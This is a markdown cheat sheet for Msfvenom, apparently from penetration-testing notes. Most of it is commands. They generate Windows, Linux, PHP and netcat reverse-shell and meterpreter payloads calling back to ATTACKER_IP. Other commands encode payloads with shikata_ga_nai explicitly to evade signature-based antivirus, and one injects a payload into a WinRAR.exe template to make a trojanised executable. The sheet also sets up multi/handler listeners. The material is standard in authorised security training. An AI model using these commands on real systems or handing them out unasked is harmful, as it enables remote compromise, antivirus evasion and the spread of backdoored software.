# Msfvenom

It is a command line utility that can be used to generate and encode MSF payloads for various operating systems as well as web servers.

Msfvenom is a combination of two utilities: msfpayload + msfencode.

When working with msfvenom, it's important to understand how the naming system works. The basic convention is as follows:

`<OS>/<arch>/<payload>`

> The exception to this convention is Windows 32bit targets. For these, the arch is not specified: `windows/shell_reverse_tcp`.


## Generating Payloads With Msfvenom

Stage/non-staged payloads examples:
- **Non-staged:** they are denoted with underscores, for example: `windows/x64/meterpreter_reverse_http`
- **Staged:** they are denoted with another forward slash, for example: `windows/x64/meterpreter/reverse_tcp`

```bash
# Check documentation
msfvenom

# List available payloads
msfvenom --list payloads
msfvenom -l payloads

# List payload formats
msfvenom --list formats

# Example reverse TCP payload for 32bit Windows 
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=ATTACKER_PORT -f exe > payloadx86.exe

# Windows x64 Reverse Shell in an exe format
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=ATTACKER_IP LPORT=ATTACKER_PORT

# Example reverse TCP for Linux
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=ATTACKER_PORT -f elf > rshell.elf

# Generate and encode a netcat reverse shell (R = export the payload in raw format)
msfvenom -p cmd/unix/reverse_netcat lhost=ATTACKER_IP lport=ATTACKER_PORT R
```


Set up a listener for the Windows payload generated above
```bash
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
set LPORT ATTACKER_PORT
```

## Encoding Payloads With Msfvenom

Encoding is the process of modifying the payload shellcode with the purpose of modifying the payload signature.

Older signature based AV solutions can be evaded using payloads encoding.

> Commonly used encoders `shikata_ga_nai` and `powershell_base64`.

```bash
# List encoders
msfvenom --list encoders

# Example of raw base64 encoded payload
msfvenom -p php/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=ATTACKER_PORT -f raw -e php/base64

# Generate encoded payload using shikata_ga_nai
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=ATTACKER_PORT -e x86/shikata_ga_nai -f exe > encodedx86.exe

# Generate encoded payload using shikata_ga_nai and increase the number of iterations to 10
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=ATTACKER_PORT -i 10 -e x86/shikata_ga_nai -f exe > encodedx86.exe
```

## Injecting Payloads into Windows Portable Executables

**Example using WinRAR**

```bash
# Generate encoded payload using shikata_ga_nai and increase the number of iterations to 10 and using WinRAR as template
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=ATTACKER_PORT -e x86/shikata_ga_nai -i 10 -f exe -x WinRAR.exe > winrar.exe

```

> To keep the original functionality of the used PE, use the `-k` option. However, this requires more testing.

**Migrate process**

```bash
# Once a meterpreter session is created
run post/windows/manage/migrate
```

## Handler: exploit/multi/handler

```bash
use multi/handler
set LHOST ATTACKER_IP
set LPORT ATTACKER_PORT
set PAYLOAD USED_PAYLOAD
```